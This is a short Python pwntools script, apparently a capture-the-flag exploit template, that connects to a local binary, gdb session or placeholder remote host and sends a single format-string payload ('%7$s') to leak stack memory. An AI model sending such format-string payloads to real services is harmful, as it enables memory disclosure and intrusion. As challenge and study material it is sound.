#!/usr/bin/env python3

from pwn import *

e = ELF("./bin_patched")

context.binary = e

def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            
            """)
    elif cond == 3:
        r = remote("addr", 1337)

    return r


def main():
    r = conn(1)


    r.send(b"%7$s")



    r.interactive()

if __name__ == "__main__":
    main()